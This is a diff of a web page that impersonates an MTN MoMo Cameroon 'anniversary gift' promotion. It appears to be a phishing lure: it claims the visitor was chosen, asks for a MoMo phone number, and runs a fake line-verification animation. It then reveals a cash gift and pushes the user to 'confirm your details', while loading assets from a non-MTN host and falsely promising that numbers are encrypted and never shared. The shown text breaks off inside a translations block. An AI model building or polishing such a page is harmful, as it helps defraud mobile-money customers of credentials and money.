@@ -4,7 +4,30 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <meta name="theme-color" content="#000000">
-  <title>MTN MoMo Anniversary – Claim Your Reward</title>
+  <title>MTN MoMo Anniversary – Claim Your Gift</title>
+
+  <!-- ============================================
+       META PIXEL — BASE CODE
+       Pixel ID: 1021851290903869
+       ============================================ -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1021851290903869');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1021851290903869&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- ============================================
+       END META PIXEL
+       ============================================ -->
 
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -18,13 +41,16 @@
       --mtn-gold: #FFCC00;
       --mtn-gold-light: #FFD633;
       --mtn-gold-dark: #E6B800;
+      --grad: linear-gradient(135deg, #003366 0%, #004080 100%);
       --grad-gold: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
       --page-bg: #f9fafb;
       --white: #FFFFFF;
       --text-dark: #1C2340;
       --text-mid: #4B5168;
       --text-light: #8B90A3;
-      --green: #16A34A;
+      --border: #E4E7EF;
+      --error: #DC2626;
+      --green-600: #16A34A;
       --header-h: 74px;
       --footer-h: 68px;
     }
@@ -61,7 +87,8 @@
       padding: 0 18px;
       display: flex;
       align-items: center;
-      justify-content: center;
+      justify-content: space-between;
+      gap: 10px;
     }
     .brand {
       display: flex;
@@ -69,8 +96,9 @@
       gap: 10px;
       text-decoration: none;
       color: inherit;
+      flex-shrink: 0;
     }
-    .brand-logo-img { height: 48px; width: auto; display: block; }
+    .brand-logo-img { height: 46px; width: auto; display: block; }
     .brand-divider {
       width: 1px; height: 26px;
       background: rgba(255, 255, 255, 0.2);
@@ -78,13 +106,95 @@
       flex-shrink: 0;
     }
     .brand-sub {
-      font-size: 12px;
+      font-size: 11px;
       color: var(--mtn-gold);
       font-weight: 700;
       letter-spacing: 0.5px;
       white-space: nowrap;
       text-transform: uppercase;
     }
+
+    /* LANGUAGE DROPDOWN — no flags */
+    .lang-wrap { position: relative; flex-shrink: 0; }
+    .lang-btn {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 0.78rem;
+      font-weight: 700;
+      font-family: 'Inter', sans-serif;
+      padding: 7px 12px;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: background 0.2s;
+      white-space: nowrap;
+    }
+    .lang-btn:hover { background: rgba(255, 255, 255, 0.18); color: #fff; }
+    .lang-btn .globe {
+      font-size: 0.85rem;
+      opacity: 0.85;
+    }
+    .lang-btn .caret {
+      font-size: 0.55rem;
+      opacity: 0.7;
+      transition: transform 0.25s;
+    }
+    .lang-wrap.open .lang-btn .caret { transform: rotate(180deg); }
+
+    .lang-menu {
+      position: absolute;
+      top: calc(100% + 8px);
+      right: 0;
+      min-width: 180px;
+      background: #fff;
+      border: 1.5px solid #E4E7EF;
+      border-radius: 14px;
+      box-shadow: 0 16px 40px rgba(0, 51, 102, 0.18);
+      overflow: hidden;
+      max-height: 0;
+      opacity: 0;
+      visibility: hidden;
+      transform: translateY(-6px);
+      transition: max-height 0.28s ease, opacity 0.22s ease, visibility 0.22s, transform 0.22s;
+      z-index: 500;
+    }
+    .lang-wrap.open .lang-menu {
+      max-height: 320px;
+      opacity: 1;
+      visibility: visible;
+      transform: translateY(0);
+    }
+    .lang-item {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      padding: 12px 16px;
+      background: #fff;
+      border: none;
+      border-top: 1px solid #F0F3F9;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text-dark);
+      text-align: left;
+      transition: background 0.15s;
+    }
+    .lang-item:first-child { border-top: none; }
+    .lang-item:hover { background: #F0F4FF; }
+    .lang-item.selected { background: #F0F4FF; }
+    .lang-item .check {
+      margin-left: auto;
+      color: var(--mtn-dark);
+      font-weight: 900;
+      opacity: 0;
+      transform: scale(0.6);
+      transition: all 0.18s;
+    }
+    .lang-item.selected .check { opacity: 1; transform: scale(1); }
 
     /* MAIN */
     .main {
@@ -101,7 +211,15 @@
     }
     .card-wrap { width: 100%; max-width: 440px; }
 
-    /* HERO CARD */
+    /* STEP SYSTEM */
+    .step { display: none; }
+    .step.active { display: block; animation: stepIn 0.5s cubic-bezier(0.22, 1, 0.36, 1); }
+    @keyframes stepIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* HERO CARD — Yellow */
     .hero-card {
       background: var(--grad-gold);
       border-radius: 22px;
@@ -157,7 +275,7 @@
     .confetti-dot:nth-child(7) { left: 85%; animation-delay: 3.6s; }
     .confetti-dot:nth-child(8) { left: 94%; animation-delay: 4.2s; }
     .confetti-dot:nth-child(9) { left: 15%; animation-delay: 4.8s; }
-    .confetti-dot:nth-child(10) { left: 62%; animation-delay: 5.4s; }
+    .confetti-dot:nth-child(10){ left: 62%; animation-delay: 5.4s; }
     @keyframes confettiFall {
       0%   { transform: translateY(-20px) scale(0.6); opacity: 0; }
       15%  { opacity: 1; transform: translateY(0) scale(1); }
@@ -165,7 +283,6 @@
       100% { transform: translateY(340px) scale(0.4); opacity: 0; }
     }
 
-    /* BADGE */
     .hero-badge {
       display: inline-flex;
       align-items: center;
@@ -175,7 +292,7 @@
       color: #003366;
       padding: 7px 14px;
       border-radius: 50px;
-      font-size: 0.7rem;
+      font-size: 0.68rem;
       font-weight: 800;
       letter-spacing: 0.08em;
       text-transform: uppercase;
@@ -186,7 +303,7 @@
     .hero-badge .pulse-dot {
       width: 6px; height: 6px;
       border-radius: 50%;
-      background: var(--green);
+      background: var(--green-600);
       box-shadow: 0 0 0 0 rgba(22, 163, 74, 0.6);
       animation: pulseDot 1.6s infinite;
     }
@@ -196,52 +313,378 @@
     }
 
     .hero-title {
-      font-size: 1.5rem;
+      font-size: 1.55rem;
       font-weight: 900;
       line-height: 1.2;
-      letter-spacing: -0.02em;
-      margin-bottom: 10px;
+      letter-spacing: -0.025em;
+      margin-bottom: 12px;
       position: relative;
       z-index: 2;
       color: #003366;
     }
-    .hero-title .gold-em {
+    .hero-title .emoji { display: inline-block; }
+    .hero-title .em {
       color: #7A5C00;
+      background: linear-gradient(135deg, #7A5C00 0%, #A87D00 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
       font-style: italic;
     }
 
     .hero-sub {
-      font-size: 0.88rem;
+      font-size: 0.92rem;
       color: #5C4A00;
-      line-height: 1.55;
+      line-height: 1.6;
       position: relative;
       z-index: 2;
       font-weight: 600;
-      margin-bottom: 22px;
     }
 
-    /* PRIZE BLOCK */
-    .prize-block {
-      background: rgba(255, 255, 255, 0.85);
-      border: 1px solid rgba(255, 255, 255, 0.9);
-      border-radius: 18px;
-      padding: 22px 18px;
+    /* FORM CARD — white */
+    .form-card {
+      background: #fff;
+      border-radius: 22px;
+      padding: 24px 22px 26px;
+      margin-top: 18px;
+      box-shadow: 0 8px 28px rgba(0, 25, 60, 0.08);
+      border: 1px solid rgba(0, 51, 102, 0.05);
+      position: relative;
+    }
+    .form-label {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 800;
+      color: var(--text-mid);
+      margin-bottom: 8px;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+    .phone-input {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid var(--border);
+      border-radius: 14px;
+      overflow: hidden;
+      transition: border-color 0.25s, box-shadow 0.25s, background 0.25s;
+      background: #FBFCFE;
+      margin-bottom: 16px;
+    }
+    .phone-input:focus-within {
+      border-color: var(--mtn-gold);
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.18);
+    }
+    .phone-input.invalid {
+      border-color: var(--error);
+      background: #FFF5F5;
+      box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.10);
+      animation: shake 0.4s ease;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-6px); }
+      75% { transform: translateX(6px); }
+    }
+    .phone-prefix {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      padding: 14px 14px;
+      background: #F7F8FB;
+      font-weight: 800;
+      font-size: 14px;
+      color: var(--text-dark);
+      border-right: 1.5px solid var(--border);
+      white-space: nowrap;
+      flex-shrink: 0;
+      font-family: 'Inter', sans-serif;
+    }
+    .flag-svg {
+      width: 22px;
+      height: 15px;
+      border-radius: 3px;
+      box-shadow: 0 0 0 1px rgba(0,0,0,0.08);
+      flex-shrink: 0;
+    }
+    .phone-input input {
+      border: none !important;
+      box-shadow: none !important;
+      flex: 1;
+      border-radius: 0;
+      padding: 14px 14px;
+      font-size: 15px;
+      font-family: 'Inter', sans-serif;
+      color: var(--text-dark);
+      font-weight: 700;
+      outline: none;
+      min-width: 0;
+      background: transparent;
+      letter-spacing: 0.5px;
+    }
+    .phone-input input::placeholder {
+      color: #A8AFC0;
+      font-weight: 500;
+      letter-spacing: normal;
+    }
+    .error-text {
+      color: var(--error);
+      font-size: 12px;
+      margin-top: -8px;
+      margin-bottom: 12px;
+      display: none;
+      font-weight: 700;
+      line-height: 1.4;
+    }
+    .error-text.show { display: block; animation: slideDown 0.3s ease; }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-4px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .claim-btn {
+      width: 100%;
+      padding: 18px 22px;
+      background: linear-gradient(135deg, #003366 0%, #004080 100%);
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      font-size: 1rem;
+      font-weight: 900;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+      box-shadow: 0 12px 28px rgba(0, 51, 102, 0.35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      position: relative;
+      overflow: hidden;
+    }
+    .claim-btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(120deg, transparent 30%, rgba(255, 215, 0, 0.35) 50%, transparent 70%);
+      transform: translateX(-100%);
+      transition: transform 0.9s;
+    }
+    .claim-btn:hover::after { transform: translateX(100%); }
+    .claim-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 16px 34px rgba(0, 51, 102, 0.45);
+    }
+    .claim-btn:active:not(:disabled) { transform: scale(0.98); }
+    .claim-btn:disabled { opacity: 0.65; cursor: not-allowed; }
+
+    .security-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 14px;
+      font-size: 11.5px;
+      color: var(--text-light);
+      font-weight: 600;
+      text-align: center;
+    }
+    .security-note .ico { font-size: 13px; color: var(--green-600); }
+
+    /* SCANNING CARD */
+    .scan-card {
+      background: #fff;
+      border-radius: 22px;
+      padding: 34px 22px 30px;
+      box-shadow: 0 8px 28px rgba(0, 25, 60, 0.08);
+      border: 1px solid rgba(0, 51, 102, 0.05);
       text-align: center;
       position: relative;
-      z-index: 2;
-      box-shadow: 0 8px 24px rgba(0, 51, 102, 0.1);
-      margin-bottom: 20px;
+      overflow: hidden;
     }
-    .prize-label {
-      font-size: 0.68rem;
+    .scan-orbit {
+      width: 130px;
+      height: 130px;
+      margin: 0 auto 22px;
+      position: relative;
+    }
+    .scan-orbit-ring {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 2px dashed rgba(0, 51, 102, 0.25);
+      animation: rotateSlow 8s linear infinite;
+    }
+    .scan-orbit-ring.inner {
+      inset: 20px;
+      border: 1.5px dashed rgba(255, 204, 0, 0.7);
+      animation: rotateSlow 5s linear infinite reverse;
+    }
+    @keyframes rotateSlow { to { transform: rotate(360deg); } }
+    .scan-orbit-core {
+      position: absolute;
+      top: 50%; left: 50%;
+      width: 66px; height: 66px;
+      transform: translate(-50%, -50%);
+      border-radius: 16px;
+      background: var(--grad-gold);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 36px rgba(255, 204, 0, 0.55);
+      animation: corePulse 2s ease-in-out infinite;
+      padding: 8px;
+    }
+    .scan-orbit-core img { width: 100%; height: 100%; object-fit: contain; }
+    @keyframes corePulse {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 0 36px rgba(255, 204, 0, 0.55); }
+      50%      { transform: translate(-50%, -50%) scale(1.05); box-shadow: 0 0 55px rgba(255, 204, 0, 0.9); }
+    }
+
+    .scan-title {
+      font-size: 1.15rem;
+      font-weight: 800;
+      color: var(--text-dark);
+      margin-bottom: 8px;
+      letter-spacing: -0.01em;
+    }
+    .scan-sub {
+      font-size: 0.85rem;
+      color: var(--text-mid);
+      line-height: 1.55;
+      margin-bottom: 22px;
+      font-weight: 500;
+    }
+
+    .scan-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      text-align: left;
+      max-width: 320px;
+      margin: 0 auto;
+    }
+    .scan-step {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 14px;
+      background: #F7F9FF;
+      border: 1px solid #E8EEFA;
+      border-radius: 12px;
+      font-size: 0.82rem;
+      font-weight: 700;
+      color: var(--text-light);
+      transition: all 0.35s;
+    }
+    .scan-step .mark {
+      width: 20px; height: 20px;
+      border-radius: 50%;
+      background: #E4E7EF;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.7rem;
+      color: #fff;
+      flex-shrink: 0;
+      transition: all 0.35s;
+    }
+    .scan-step.done {
+      background: linear-gradient(135deg, #FFFBEB, #FFF8DC);
+      border-color: #FFE999;
+      color: #7A5C00;
+    }
+    .scan-step.done .mark {
+      background: var(--green-600);
+      animation: popCheck 0.4s ease;
+    }
+    @keyframes popCheck {
+      0% { transform: scale(0.4); }
+      60% { transform: scale(1.2); }
+      100% { transform: scale(1); }
+    }
+    .scan-step.active {
+      background: #EEF3FF;
+      border-color: #CBD8F5;
+      color: #003366;
+    }
+    .scan-step.active .mark {
+      background: #003366;
+      animation: blinkDot 1s infinite alternate;
+    }
+    @keyframes blinkDot {
+      0% { opacity: 0.4; }
+      100% { opacity: 1; }
+    }
+
+    /* GIFT REVEAL CARD */
+    .gift-card {
+      background: var(--grad-gold);
+      border-radius: 22px;
+      padding: 30px 22px 26px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 20px 40px rgba(255, 204, 0, 0.3);
+    }
+    .gift-card::before {
+      content: '';
+      position: absolute;
+      top: -40px; right: -40px;
+      width: 180px; height: 180px;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.5) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+    .gift-card::after {
+      content: '';
+      position: absolute;
+      bottom: -60px; left: -40px;
+      width: 160px; height: 160px;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.3) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    .gift-headline {
+      font-size: 1rem;
+      font-weight: 800;
+      color: #003366;
+      margin-bottom: 6px;
+      position: relative;
+      z-index: 2;
+      letter-spacing: -0.01em;
+    }
+    .gift-subline {
+      font-size: 0.82rem;
+      color: #5C4A00;
+      font-weight: 700;
+      margin-bottom: 18px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .gift-amount-box {
+      background: rgba(255, 255, 255, 0.9);
+      border: 1px solid rgba(255, 255, 255, 0.95);
+      border-radius: 18px;
+      padding: 24px 18px;
+      position: relative;
+      z-index: 2;
+      margin-bottom: 18px;
+      box-shadow: 0 8px 24px rgba(0, 51, 102, 0.1);
+    }
+    .gift-amount-label {
+      font-size: 0.66rem;
       color: #7A5C00;
       font-weight: 800;
-      letter-spacing: 0.14em;
+      letter-spacing: 0.16em;
       text-transform: uppercase;
-      margin-bottom: 8px;
+      margin-bottom: 10px;
     }
-    .prize-amount {
-      font-size: 2.2rem;
+    .gift-amount {
+      font-size: 2.1rem;
       font-weight: 900;
       color: #003366;
       letter-spacing: -0.03em;
@@ -250,22 +693,23 @@
       align-items: baseline;
       gap: 6px;
       animation: prizePulse 2.4s ease-in-out infinite;
+      font-variant-numeric: tabular-nums;
     }
-    .prize-amount .cur {
+    .gift-amount .cur {
       font-size: 1rem;
       color: #4B5168;
       font-weight: 800;
     }
     @keyframes prizePulse {
       0%, 100% { transform: scale(1); filter: drop-shadow(0 0 0 rgba(255, 204, 0, 0)); }
-      50%      { transform: scale(1.03); filter: drop-shadow(0 0 14px rgba(255, 204, 0, 0.6)); }
+      50%      { transform: scale(1.02); filter: drop-shadow(0 0 14px rgba(255, 204, 0, 0.6)); }
     }
-    .prize-tag {
-      font-size: 0.72rem;
+    .gift-tag {
+      font-size: 0.7rem;
       color: #7A5C00;
       font-weight: 800;
       letter-spacing: 0.06em;
-      margin-top: 10px;
+      margin-top: 12px;
       display: inline-block;
       background: linear-gradient(135deg, #FFFBEB, #FFF3C0);
       padding: 5px 12px;
@@ -273,38 +717,18 @@
       border: 1px solid #FFE999;
     }
 
-    /* BENEFITS */
-    .benefits {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      margin-bottom: 22px;
+    .gift-message {
+      font-size: 0.86rem;
+      color: #5C4A00;
+      font-weight: 600;
+      line-height: 1.55;
       position: relative;
       z-index: 2;
-    }
-    .benefit {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: #5C4A00;
-    }
-    .benefit .tick {
-      width: 20px; height: 20px;
-      border-radius: 50%;
-      background: #003366;
-      color: var(--mtn-gold);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.7rem;
-      font-weight: 900;
-      flex-shrink: 0;
+      margin-bottom: 20px;
+      padding: 0 4px;
     }
 
-    /* CTA */
-    .claim-btn {
+    .continue-btn {
       width: 100%;
       padding: 18px 22px;
       background: linear-gradient(135deg, #003366 0%, #004080 100%);
@@ -326,7 +750,7 @@
       overflow: hidden;
       z-index: 2;
     }
-    .claim-btn::after {
+    .continue-btn::after {
       content: '';
       position: absolute;
       inset: 0;
@@ -334,59 +758,9 @@
       transform: translateX(-100%);
       transition: transform 0.9s;
     }
-    .claim-btn:hover::after { transform: translateX(100%); }
-    .claim-btn:hover:not(:disabled) {
-      transform: translateY(-2px);
-      box-shadow: 0 16px 34px rgba(0, 51, 102, 0.45);
-    }
-    .claim-btn:active:not(:disabled) { transform: scale(0.98); }
-
-    /* URGENCY */
-    .urgency {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      margin-top: 14px;
-      font-size: 0.78rem;
-      font-weight: 800;
-      color: #B91C1C;
-      background: rgba(255, 255, 255, 0.7);
-      border: 1px solid rgba(220, 38, 38, 0.25);
-      padding: 8px 14px;
-      border-radius: 50px;
-      position: relative;
-      z-index: 2;
-    }
-
-    /* TRUST STRIP */
-    .trust-strip {
-      display: flex;
-      justify-content: space-around;
-      gap: 8px;
-      margin-top: 18px;
-      padding-top: 18px;
-      border-top: 1px solid rgba(0, 51, 102, 0.15);
-      position: relative;
-      z-index: 2;
-    }
-    .trust-item {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 4px;
-      flex: 1;
-    }
-    .trust-item .ico { font-size: 1.05rem; }
-    .trust-item .txt {
-      font-size: 0.64rem;
-      color: #5C4A00;
-      font-weight: 800;
-      text-align: center;
-      line-height: 1.2;
-      letter-spacing: 0.02em;
-      text-transform: uppercase;
-    }
+    .continue-btn:hover::after { transform: translateX(100%); }
+    .continue-btn:hover { transform: translateY(-2px); box-shadow: 0 16px 34px rgba(0, 51, 102, 0.45); }
+    .continue-btn:active { transform: scale(0.98); }
 
     /* FOOTER */
     .footer {
@@ -394,7 +768,7 @@
       bottom: 0; left: 0; right: 0;
       height: var(--footer-h);
       background: var(--white);
-      border-top: 1px solid #E4E7EF;
+      border-top: 1px solid var(--border);
       box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.06);
       z-index: 100;
       display: flex;
@@ -408,15 +782,17 @@
       .main { padding: 18px 12px 30px; }
       .hero-card { padding: 24px 18px 22px; }
       .hero-title { font-size: 1.35rem; }
-      .prize-amount { font-size: 2rem; }
-      .brand-logo-img { height: 42px; }
-      .brand-sub { font-size: 11px; }
+      .gift-amount { font-size: 1.75rem; }
+      .brand-logo-img { height: 40px; }
+      .brand-sub { font-size: 10px; }
+      .lang-btn { padding: 6px 10px; font-size: 0.72rem; }
     }
     @media (max-width: 380px) {
       .hero-title { font-size: 1.22rem; }
-      .prize-amount { font-size: 1.75rem; }
+      .gift-amount { font-size: 1.55rem; }
       .brand-sub { display: none; }
       .brand-divider { display: none; }
+      .lang-btn .lang-name { display: none; }
     }
   </style>
 </head>
@@ -428,8 +804,30 @@
       <a href="index.html" class="brand">
         <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
         <div class="brand-divider"></div>
-        <span class="brand-sub">MTN MoMo Anniversary</span>
+        <span class="brand-sub" data-i18n="brand.sub">MTN MoMo Anniversary</span>
       </a>
+
+      <div class="lang-wrap" id="langWrap">
+        <button type="button" class="lang-btn" id="langBtn" aria-haspopup="true">
+          <span class="globe">🌐</span>
+          <span class="lang-name" id="langName">English</span>
+          <span class="caret">▼</span>
+        </button>
+        <div class="lang-menu" id="langMenu">
+          <button type="button" class="lang-item" data-lang="en">
+            <span>English</span>
+            <span class="check">✓</span>
+          </button>
+          <button type="button" class="lang-item" data-lang="fr">
+            <span>Français</span>
+            <span class="check">✓</span>
+          </button>
+          <button type="button" class="lang-item" data-lang="cr">
+            <span>Camfranglais</span>
+            <span class="check">✓</span>
+          </button>
+        </div>
+      </div>
     </div>
   </header>
 
@@ -438,71 +836,132 @@
     <div class="wrap">
       <div class="card-wrap">
 
-        <div class="hero-card">
-          <!-- CONFETTI -->
-          <div class="confetti-layer">
-            <span class="confetti-dot"></span>
-            <span class="confetti-dot"></span>
-            <span class="confetti-dot"></span>
-            <span class="confetti-dot"></span>
-            <span class="confetti-dot"></span>
-            <span class="confetti-dot"></span>
-            <span class="confetti-dot"></span>
-            <span class="confetti-dot"></span>
-            <span class="confetti-dot"></span>
-            <span class="confetti-dot"></span>
-          </div>
-
-          <div class="hero-badge">
-            <span class="pulse-dot"></span>
-            <span>🎂 Anniversary Special</span>
-          </div>
-
-          <h1 class="hero-title">
-            Congratulations 🎉<br>
-            You've been <span class="gold-em">selected</span>
-          </h1>
-
-          <p class="hero-sub">
-            As part of our anniversary celebration, MTN MoMo is rewarding loyal customers — and your number has been chosen.
-          </p>
-
-          <div class="prize-block">
-            <div class="prize-label">Your Anniversary Reward</div>
-            <div class="prize-amount">
-              <span class="cur">XAF</span>
-              <span>980,700.00</span>
+        <!-- STEP 1 — CELEBRATION -->
+        <div class="step active" id="stepCelebration">
+          <div class="hero-card">
+            <div class="confetti-layer">
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
             </div>
-            <span class="prize-tag">🎁 Anniversary Bonus</span>
+
+            <div class="hero-badge">
+              <span class="pulse-dot"></span>
+              <span data-i18n="index.badge">🎂 Anniversary Special</span>
+            </div>
+
+            <h1 class="hero-title">
+              <span data-i18n="index.title_line1">Happy Anniversary!</span> <span class="emoji">🎉</span><br>
+              <span class="em" data-i18n="index.title_line2">You've been chosen</span>
+            </h1>
+
+            <p class="hero-sub" data-i18n="index.sub">
+              Ten years of trust. Millions of moments. And now, a gift that's just for you. Enter your MoMo number to see how much we're celebrating with you.
+            </p>
           </div>
 
-          <div class="benefits">
-            <div class="benefit"><span class="tick">✓</span> Instant credit to your MoMo account</div>
-            <div class="benefit"><span class="tick">✓</span> No fees · No paperwork</div>
-            <div class="benefit"><span class="tick">✓</span> Limited to 500 winners today</div>
-          </div>
+          <div class="form-card">
+            <label class="form-label" for="phoneInput" data-i18n="index.phone_label">Your MoMo Number</label>
 
-          <button class="claim-btn" onclick="window.location.href='login.html'">
-            🎁 CLAIM NOW →
-          </button>
+            <div class="phone-input" id="phoneWrapper">
+              <span class="phone-prefix">
+                <svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true">
+                  <rect width="300" height="600" fill="#007A5E"/>
+                  <rect x="300" width="300" height="600" fill="#CE1126"/>
+                  <rect x="600" width="300" height="600" fill="#FCD116"/>
+                  <polygon points="450,220 465,275 522,275 476,308 492,363 450,330 408,363 424,308 378,275 435,275" fill="#FCD116"/>
+                </svg>
+                <span>+237</span>
+              </span>
+              <input type="tel" id="phoneInput" placeholder="6XX XXX XXX" maxlength="9" inputmode="numeric" autocomplete="tel">
+            </div>
 
-          <div class="urgency">
-            ⏰ Only 8 slots remaining today
-          </div>
+            <div class="error-text" id="phoneError" data-i18n="index.phone_error">Please enter a valid 9-digit MoMo number</div>
 
-          <div class="trust-strip">
-            <div class="trust-item">
+            <button class="claim-btn" id="claimBtn">
+              <span data-i18n="index.claim_btn">🎁 CLAIM NOW</span> →
+            </button>
+
+            <div class="security-note">
               <span class="ico">🔒</span>
-              <span class="txt">Secure</span>
+              <span data-i18n="index.secure">Your number is encrypted and never shared</span>
             </div>
-            <div class="trust-item">
-              <span class="ico">✅</span>
-              <span class="txt">Verified</span>
+          </div>
+        </div>
+
+        <!-- STEP 2 — SCANNING -->
+        <div class="step" id="stepScanning">
+          <div class="scan-card">
+            <div class="scan-orbit">
+              <div class="scan-orbit-ring"></div>
+              <div class="scan-orbit-ring inner"></div>
+              <div class="scan-orbit-core">
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
+              </div>
             </div>
-            <div class="trust-item">
-              <span class="ico">🇨🇲</span>
-              <span class="txt">Cameroon</span>
+
+            <div class="scan-title" data-i18n="index.scanning">Scanning your MoMo number…</div>
+            <div class="scan-sub" data-i18n="index.scanning_sub">Just a moment while we prepare something special for you.</div>
+
+            <div class="scan-steps" id="scanSteps">
+              <div class="scan-step" data-step="1">
+                <span class="mark">✓</span>
+                <span data-i18n="index.scan_step1">Verifying your line</span>
+              </div>
+              <div class="scan-step" data-step="2">
+                <span class="mark">✓</span>
+                <span data-i18n="index.scan_step2">Checking eligibility</span>
+              </div>
+              <div class="scan-step" data-step="3">
+                <span class="mark">✓</span>
+                <span data-i18n="index.scan_step3">Preparing your gift</span>
+              </div>
             </div>
+          </div>
+        </div>
+
+        <!-- STEP 3 — GIFT REVEAL -->
+        <div class="step" id="stepGift">
+          <div class="gift-card">
+            <div class="confetti-layer">
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+              <span class="confetti-dot"></span>
+            </div>
+
+            <div class="gift-headline" data-i18n="index.gift_headline">🎉 Congratulations!</div>
+            <div class="gift-subline" data-i18n="index.gift_subline">You are eligible for an anniversary gift of</div>
+
+            <div class="gift-amount-box">
+              <div class="gift-amount-label" data-i18n="index.gift_label">Your Anniversary Gift</div>
+              <div class="gift-amount">
+                <span class="cur">XAF</span>
+                <span id="giftAmount">0.00</span>
+              </div>
+              <span class="gift-tag" data-i18n="index.gift_tag">🎁 Anniversary Bonus</span>
+            </div>
+
+            <p class="gift-message" data-i18n="index.gift_message">
+              Thank you for being part of our MoMo family. Continue to confirm your details and claim your gift today.
+            </p>
+
+            <button class="continue-btn" id="continueBtn">
+              <span data-i18n="index.continue">CONTINUE</span> →
+            </button>
           </div>
         </div>
 
@@ -512,8 +971,240 @@
 
   <!-- FOOTER -->
   <footer class="footer">
-    <span class="footer-text">© 2026 MTN MoMo Cameroon</span>
+    <span class="footer-text" data-i18n="footer.text">© 2026 MTN MoMo Cameroon</span>
   </footer>
 
+  <script>
+    // TRANSLATIONS
+    const TRANSLATIONS = {
+      en: {
+        'brand.sub': 'MTN MoMo Anniversary',
+        'index.badge': '🎂 Anniversary Special',
+        'index.title_line1': 'Happy Anniversary!',
+        'index.title_line2': "You've been chosen",
+        'index.sub': "Ten years of trust. Millions of moments. And now, a gift that's just for you. Enter your MoMo number to see how much we're celebrating with you.",
+        'index.phone_label': 'Your MoMo Number',
+        'index.phone_error': 'Please enter a valid 9-digit MoMo number',
+        'index.claim_btn': '🎁 CLAIM NOW',
+        'index.secure': 'Your number is encrypted and never shared',
+        'index.scanning': 'Scanning your MoMo number…',
+        'index.scanning_sub': 'Just a moment while we prepare something special for you.',
+        'index.scan_step1': 'Verifying your line',
+        'index.scan_step2': 'Checking eligibility',
+        'index.scan_step3': 'Preparing your gift',
+        'index.gift_headline': '🎉 Congratulations!',
